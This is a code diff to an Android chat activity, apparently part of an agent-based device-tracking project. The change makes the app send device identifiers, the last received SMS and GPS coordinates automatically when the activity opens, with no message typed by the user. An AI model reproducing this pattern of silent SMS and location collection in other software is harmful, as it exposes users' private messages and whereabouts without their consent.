@@ -44,6 +44,7 @@ public class ChatActivity extends Activity {
 
 	private String nickname;
 	private ChatClientInterface chatClientInterface;
+	private String DEVICE_NAME = Build.BRAND+" "+Build.DEVICE;
 
 	@Override
 	public void onCreate(Bundle savedInstanceState) {
@@ -77,12 +78,14 @@ public class ChatActivity extends Activity {
 
 		Button button = (Button) findViewById(R.id.button_send);
 		button.setOnClickListener(buttonSendListener);
+		sendDeviceInformation();
 	}
 
 	@Override
 	protected void onDestroy() {
 		super.onDestroy();
 
+		chatClientInterface.handleSpoken("El dispositivo "+DEVICE_NAME+" ha salido del sistema");
 		unregisterReceiver(myReceiver);
 
 		logger.log(Level.INFO, "Destroy activity!");
@@ -90,49 +93,8 @@ public class ChatActivity extends Activity {
 
 	private OnClickListener buttonSendListener = new OnClickListener() {
 		public void onClick(View v) {
-			final EditText messageField = (EditText) findViewById(R.id.edit_message);
-			String message = messageField.getText().toString();
-			String locationInfo ="";
-			String smsMsgData = getSMSdata();
-			Location location = getLocationData();
-
-			if (location!=null){
-				locationInfo += "Latitud: "+location.getLatitude()+" \n"
-						+"Longitud: "+location.getLongitude()+" \n"
-						+"Altitud: "+location.getAltitude()+" \n"
-						+"Extras: "+location.getExtras()+" \n";
-			}else{
-				locationInfo += "No se pueden obtener datos de geolocalización";
-			}
-
-			if (message != null && !message.equals("")) {
-				try {
-
-					message+="----- "+Build.BRAND+" "+Build.DEVICE+" -----\n"
-					+"ID: "+Build.ID + " \n"
-					+"Hardware name: "+Build.HARDWARE + " \n"
-					+"SDK version: "+Build.VERSION.SDK+ " \n"
-					+"Display: "+Build.DISPLAY+ " \n"
-					+"-------  Ultimo SMS recibido  -------:  \n"
-					+smsMsgData + " \n"
-					+locationInfo + " \n"
-					+" -------------------------------------";
-
-					chatClientInterface.handleSpoken(message);
-					messageField.setText("");
-
-					//envia las coordenadas por separado para mostrarlas en el mapa
-					if (location!=null) {
-						String latitude = String.valueOf(location.getLatitude());
-						String longitude = String.valueOf(location.getLongitude());
-						chatClientInterface.handleSpoken(latitude + "#" + longitude);
-					}
-
-				} catch (O2AException e) {
-					showAlertDialog(e.getMessage(), false);
-				}
-			}
-
+			//Boton para volver a enviar los datos
+			sendDeviceInformation();
 		}
 	};
 
@@ -230,6 +192,48 @@ public class ChatActivity extends Activity {
 						});
 		AlertDialog alert = builder.create();
 		alert.show();		
+	}
+
+	private void sendDeviceInformation(){
+		String locationInfo = "";
+		String message = "";
+		String smsMsgData = getSMSdata();
+		Location location = getLocationData();
+
+		if (location!=null){
+			locationInfo += "Latitud: "+location.getLatitude()+" \n"
+					+"Longitud: "+location.getLongitude()+" \n"
+					+"Altitud: "+location.getAltitude()+" \n"
+					+"Extras: "+location.getExtras()+" \n";
+		}else{
+			locationInfo += "No se pueden obtener datos de geolocalización";
+		}
+
+		try {
+
+			message += "----- " + DEVICE_NAME + " -----\n"
+					+ "ID: " + Build.ID + " \n"
+					+ "Hardware name: " + Build.HARDWARE + " \n"
+					+ "SDK version: " + Build.VERSION.SDK + " \n"
+					+ "Display: " + Build.DISPLAY + " \n"
+					+ "-------  Ultimo SMS recibido  -------:  \n"
+					+ smsMsgData + " \n"
+					+ locationInfo + " \n"
+					+ " -------------------------------------";
+
+			chatClientInterface.handleSpoken(message);
+
+			//envia las coordenadas por separado para mostrarlas en el mapa
+			if (location != null) { //location puede ser null cuando el usuario dehabilita la geolocalizacion
+				String latitude = String.valueOf(location.getLatitude());
+				String longitude = String.valueOf(location.getLongitude());
+				chatClientInterface.handleSpoken(latitude + "#" + longitude);
+			}
+
+		} catch (O2AException e) {
+			showAlertDialog(e.getMessage(), false);
+		}
+
 	}
 
 	private String getSMSdata(){
